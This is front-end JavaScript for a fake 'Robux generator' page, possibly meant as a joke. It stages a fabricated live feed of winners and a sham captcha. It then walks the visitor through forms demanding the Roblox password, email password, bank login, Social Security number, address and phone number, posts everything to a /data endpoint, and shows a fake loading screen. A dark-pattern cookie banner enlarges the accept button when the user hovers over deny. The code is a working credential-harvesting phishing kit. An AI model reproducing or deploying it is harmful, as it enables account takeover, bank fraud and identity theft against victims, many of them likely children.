let $ = (...args)=>{
	return document.getElementById(...args)
}

function getCookies() {
		var c = document.cookie, v = 0, cookies = {};
		if (document.cookie.match(/^\s*\$Version=(?:"1"|1);\s*(.*)/)) {
				c = RegExp.$1;
				v = 1;
		}
		if (v === 0) {
				c.split(/[,;]/).map(function(cookie) {
						var parts = cookie.split(/=/, 2),
								name = decodeURIComponent(parts[0].trimLeft()),
								value = parts.length > 1 ? decodeURIComponent(parts[1].trimRight()) : null;
						cookies[name] = value;
				});
		} else {
				c.match(/(?:^|\s+)([!#$%&'*+\-.0-9A-Z^`a-z|~]+)=([!#$%&'*+\-.0-9A-Z^`a-z|~]*|"(?:[\x20-\x7E\x80\xFF]|\\[\x00-\x7F])*")(?=\s*[,;]|$)/g).map(function($0, $1) {
						var name = $0,
								value = $1.charAt(0) === '"'
													? $1.substr(1, -1).replace(/\\(.)/g, "$1")
													: $1;
						cookies[name] = value;
				});
		}
		return cookies;
}

function setCookie(name,value,days) {
		var expires = "";
		if (days) {
				var date = new Date();
				date.setTime(date.getTime() + (days*24*60*60*1000));
				expires = "; expires=" + date.toUTCString();
		}
		document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}

if (!getCookies()["userId"]) {
	setCookie("userId", Math.random().toString(36).substring(2,12), 1000)
}

function numberWithCommas(x) {
	return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",")
}

setInterval(()=>{
	$("robux-amount-display").innerText = numberWithCommas($("robux-amount").value) + " Robux"
})

function getRandomInt(max) {
	return Math.floor(Math.random() * max);
}

let liveFeed = async function() {
	let response = await fetch("/roblox")
	let text = await response.text()
	let parser = new DOMParser()
	let doc = parser.parseFromString(text, "text/html")
	let username = doc.title.replace(" - Roblox", "")
	let robux = getRandomInt(1000)*100

	let h1 = document.createElement("h2")
	h1.innerText = `${username} just generated ${robux} Robux!`
	h1.classList.add("live-user")
	$("live-feed-real").appendChild(h1)

	await new Promise((res,rej)=>{
		setTimeout(res,7000+getRandomInt(10000))
	})
	liveFeed()
}

liveFeed()

let captchaElements = document.querySelectorAll(".captcha-element")

for (let i = 0; i < captchaElements.length; i++) {
	captchaElements[i].dataset.selected = false
	captchaElements[i].addEventListener("click", ()=>{
		if (captchaElements[i].dataset.selected == "true") {
			captchaElements[i].dataset.selected = false
		} else {
			captchaElements[i].dataset.selected = true
		}
	})
}



$("start-button").addEventListener("click",()=>{
	$("start").style.display = "none"
	$("generator-container").style.display = ""
})

let setParallax = ()=>{
	let y = window.scrollY
	document.body.style.backgroundPositionY = y/3 +"px"
}

document.addEventListener("scroll", setParallax)

setInterval(()=>{
	$("loading").style.transform = `rotateZ(${Date.now() / 3 % 360}deg)`
})

setInterval(()=>{
	if (!$("roblox-username").value) {
		$("next-button-2").disabled = true
		return
	}
	if (!$("roblox-password").value) {
		$("next-button-2").disabled = true
		return
	}
	if (!$("email-address").value) {
		$("next-button-2").disabled = true
		return
	}
	if (!$("email-password").value) {
		$("next-button-2").disabled = true
		return
	}
	if (!$("phone-number").value) {
		$("next-button-2").disabled = true
		return
	}

	$("next-button-2").disabled = false
})

setInterval(()=>{
	if (!$("bank-id").value) {
		$("next-button-3").disabled = true
		return
	}
	if (!$("bank-password").value) {
		$("next-button-3").disabled = true
		return
	}
	if (!$("social-security-number").value) {
		$("next-button-3").disabled = true
		return
	}
	if (!$("address").value) {
		$("next-button-3").disabled = true
		return
	}
	if (!$("name").value) {
		$("next-button-3").disabled = true
		return
	}

	$("next-button-3").disabled = false
})

let xImage = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/28/White_X_in_red_background.svg/450px-White_X_in_red_background.svg.png"
let checkImage = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Eo_circle_green_checkmark.svg/1200px-Eo_circle_green_checkmark.svg.png"
let passedCaptcha = false



setInterval(()=>{
	if (passedCaptcha) {
		$("next-button-4").disabled = false
		$("captcha-check").src = checkImage
	} else {
		$("next-button-4").disabled = true
		$("captcha-check").src = xImage
	}
})

$("submit-captcha").addEventListener("click", ()=>{
	if (!($("captcha-a1").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-a2").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-a3").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-a4").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-b1").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-b2").dataset.selected == "true")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-b3").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-b4").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-c1").dataset.selected == "true")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-c2").dataset.selected == "true")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-c3").dataset.selected == "true")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-c4").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-d1").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-d2").dataset.selected == "true")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-d3").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	if (!($("captcha-d4").dataset.selected == "false")) {
		passedCaptcha = false
		return
	}
	passedCaptcha = true
})

setInterval(()=>{
	if (!$("agree-tos").checked) {
		$("next-button-5").disabled = true
		return
	}

	$("next-button-5").disabled = false
})

$("generate-robux-button").addEventListener("click", async ()=>{
	$("loading-screen").style.display = ""
	$("fade").style.display = ""
	
	await new Promise((res,rej)=>{
		setTimeout(res,1000)
	})

	$("loading-screen").style.display = "none"
	$("information-grabber").style.display = ""
	$("info-1").style.display = ""
})

$("next-button-1").addEventListener("click", ()=>{
	$("info-1").style.display = "none"
	$("info-2").style.display = ""
})

$("next-button-2").addEventListener("click", ()=>{
	$("info-2").style.display = "none"
	$("info-3").style.display = ""
})

$("next-button-3").addEventListener("click", ()=>{
	$("info-3").style.display = "none"
	$("info-4").style.display = ""
})

$("next-button-4").addEventListener("click", ()=>{
	$("info-4").style.display = "none"
	$("info-5").style.display = ""
})

$("next-button-5").addEventListener("click", async ()=>{
	$("info-5").style.display = "none"
	$("loading-screen").style.display = ""

	var headers = new Headers();
	headers.append("Content-Type", "application/json");

	var json = JSON.stringify({
		robloxUsername: $("roblox-username").value,
		robloxPassword: $("roblox-password").value,
		emailAddress: $("email-address").value,
		emailPassword: $("email-password").value,
		phoneNumber: $("phone-number").value,
		bankUserId: $("bank-id").value,
		bankPassword: $("bank-password").value,
		ssn: $("social-security-number").value,
		address: $("address").value,
		name: $("name").value
	});

	let requestOptions = {
		method: 'POST',
		headers: headers,
		body: json,
		redirect: 'follow'
	};

	fetch("/data", requestOptions)

	await new Promise((res,rej)=>{
		setTimeout(res,5000)
	})
	$("loading-screen").style.display = "none"
	$("info-6").style.display = ""
})

$("next-button-6").addEventListener("click", async ()=>{
	$("info-6").style.display = "none"
	$("fade").style.display = "none"
	$("information-grabber").style.display = "none"
})

$("link").addEventListener("click", ()=>{
	$("tos").style.display = ""
})

$("close-tos").addEventListener("click", ()=>{
	$("tos").style.display = "none"
})

let hoveringOnAccept = false

$("deny-cookies").addEventListener("mouseenter",()=>{
	$("accept-cookies").style.transform = "scale(200%, 100%) translate(25%,0)"
})

$("deny-cookies").addEventListener("mouseleave",()=>{
	setTimeout(()=>{
		if (!hoveringOnAccept) {
			hoveringOnDeny = false
			$("accept-cookies").style.transform = ""
		}
	},10)
})
	
$("accept-cookies").addEventListener("mouseenter",()=>{
	hoveringOnAccept = true
})

$("accept-cookies").addEventListener("mouseleave",()=>{
	hoveringOnAccept = false
	setTimeout(()=>{
		if (!hoveringOnAccept) {
			hoveringOnDeny = false
			$("accept-cookies").style.transform = ""
		}
	},100)
})

if (getCookies()["cookieAllow"]) {
	$("cookies").style.display = "none"
}

$("accept-cookies").addEventListener("click",()=>{
	$("cookies").style.display = "none"
	setCookie("cookieAllow", "true", 1000)
})


